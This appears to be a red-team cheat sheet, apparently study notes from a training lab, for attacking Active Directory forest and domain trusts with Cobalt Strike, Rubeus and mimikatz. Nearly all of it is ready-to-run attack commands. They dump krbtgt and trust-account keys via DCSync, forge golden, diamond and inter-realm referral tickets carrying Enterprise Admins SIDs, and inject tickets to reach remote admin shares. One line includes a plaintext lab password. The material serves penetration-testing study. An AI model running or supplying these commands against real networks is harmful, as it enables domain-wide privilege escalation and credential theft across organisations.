# Forest and Trust Attacks (Cobalt Strike)

---

## Trust Enumeration

### Enumerate Trusts

```
ldapsearch (objectClass=trustedDomain)
ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes,flatName
```

### Trust Account (won't appear in CN=Users)

```
ldapsearch (samAccountType=805306370) --attributes samAccountName
# Output: sAMAccountName: PARTNER$
```

### trustDirection Values

| Value | Meaning |
|-------|---------|
| 0 | TRUST_DIRECTION_DISABLED |
| 1 | TRUST_DIRECTION_INBOUND |
| 2 | TRUST_DIRECTION_OUTBOUND |
| 3 | TRUST_DIRECTION_BIDIRECTIONAL |

### trustAttributes Flags

| Value | Flag | Description |
|-------|------|-------------|
| 1 | TRUST_ATTRIBUTE_NON_TRANSITIVE | Non-transitive trust |
| 4 | TRUST_ATTRIBUTE_QUARANTINED_DOMAIN | SID filtering enabled |
| 8 | TRUST_ATTRIBUTE_FOREST_TRANSITIVE | Transitive between forests |
| 32 | TRUST_ATTRIBUTE_WITHIN_FOREST | Between domains in same forest |
| 64 | TRUST_ATTRIBUTE_TREAT_AS_EXTERNAL | Between domains in different forests (SID filtering implied) |

---

## Parent-Child Trust Abuse

When DA in child domain → escalate to Enterprise Admin in forest root.

### Get Child Domain krbtgt Hash

```
dcsync dublin.inlanefreight.local DUBLIN\krbtgt
```

### Get Child Domain SID

```
ldapsearch (objectClass=domain) --attributes objectSid
```

### Get Parent Domain SID

```
ldapsearch (objectClass=domain) --attributes objectSid --hostname ilf-dc-1.inlanefreight.local --dn DC=inlanefreight,DC=local
```

### Forge Golden Ticket with Enterprise Admins SID

```
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:<child-krbtgt-aes256> /user:Administrator /domain:dublin.inlanefreight.local /sid:<child-domain-sid> /sids:<parent-domain-sid>-519 /nowrap
```

**Parameters:**
- `/aes256` - Child domain's krbtgt AES256 hash
- `/user` - User to impersonate
- `/domain` - Child domain FQDN
- `/sid` - Child domain SID
- `/sids` - Parent domain SID with **-519** (Enterprise Admins RID)

**Save to file:**
```
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:<hash> /user:Administrator /domain:dublin.inlanefreight.local /sid:<child-sid> /sids:<parent-sid>-519 /outfile:C:\Users\Attacker\Desktop\golden
```

### Use the Ticket

```
kerberos_ticket_use C:\Users\Attacker\Desktop\golden
run klist
ls \\ilf-dc-1\c$
```

### Alternative: Diamond Ticket

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /sids:<parent-domain-sid>-512 /krbkey:<child-krbtgt-aes256> /nowrap
```

---

## One-Way Inbound Trust (You're in Trusted Domain)

You can access resources in the trusting domain.

### Verify Trust Direction

```
ldapsearch (objectClass=trustedDomain) --attributes trustDirection,trustPartner,trustAttributes,flatName

# trustDirection: 1 = INBOUND = you're in trusted domain
```

### Find Foreign Security Principals

```
ldapsearch (objectClass=foreignSecurityPrincipal) --attributes cn,memberOf --hostname partner.com --dn DC=partner,DC=com
```

Output shows SID from your domain that has access to trusting domain.

### Identify the Principal

```
ldapsearch (objectSid=S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX-XXXX)
```

### Enumerate Trusting Domain Computers

```
ldapsearch (samAccountType=805306369) --attributes samAccountName --dn DC=partner,DC=com --hostname partner.com
```

### Forge Inter-Realm Referral Ticket

Get inter-realm key:
```
make_token INLANEFREIGHT\bjohnson Passw0rd!
dcsync inlanefreight.local INLANEFREIGHT\PARTNER$
rev2self
```

Forge referral ticket:
```
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /user:jyoung /domain:INLANEFREIGHT.LOCAL /sid:<trusted-domain-sid> /id:<user-rid> /groups:513,1106,6102 /service:krbtgt/partner.com /rc4:<ntlm-hash> /nowrap
```

Request service ticket in trusting domain:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:cifs/par-jmp-1.partner.com /dc:par-dc-1.partner.com /ticket:<inter-realm-tgt> /nowrap
```

Inject and access:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:<service-ticket>
run klist
ls \\par-jmp-1.partner.com\c$
```

---

## One-Way Outbound Trust (You're in Trusting Domain)

You're on the "wrong" side - no direct access to trusted domain.

### Verify Trust Direction

```
ldapsearch (objectClass=trustedDomain) --attributes trustDirection,trustPartner,trustAttributes,flatName

# trustDirection: 2 = OUTBOUND = you're in trusting domain
```

### Get TDO GUID

```
ldapsearch (objectClass=trustedDomain) --attributes name,objectGUID
# objectGUID: 288d9ee6-2b3c-42aa-bef8-959ab4e484ed
```

### DCSync the Inter-Realm Key

```
mimikatz lsadump::dcsync /domain:partner.com /guid:{288d9ee6-2b3c-42aa-bef8-959ab4e484ed}
```

`[Out]` = current key, `[Out-1]` = previous key

### Request TGT as Trust Account

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:PARTNER$ /domain:INLANEFREIGHT.LOCAL /dc:ilf-dc-1.inlanefreight.local /rc4:<inter-realm-key> /nowrap
```

### Inject and Enumerate (High Integrity)

```
make_token INLANEFREIGHT\PARTNER$ FakePass
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:<ticket>
run klist
ldapsearch (objectClass=domain) --dn DC=inlanefreight,DC=local --attributes name,objectSid --hostname inlanefreight.local
```

---

## Quick Reference

| Scenario | Trust Direction | Strategy |
|----------|-----------------|----------|
| Child → Parent | Bidirectional | Golden ticket with Enterprise Admins SID |
| Trusted → Trusting | Inbound (1) | Find foreign principals, forge referral tickets |
| Trusting → Trusted | Outbound (2) | DCSync trust account, use as stepping stone |
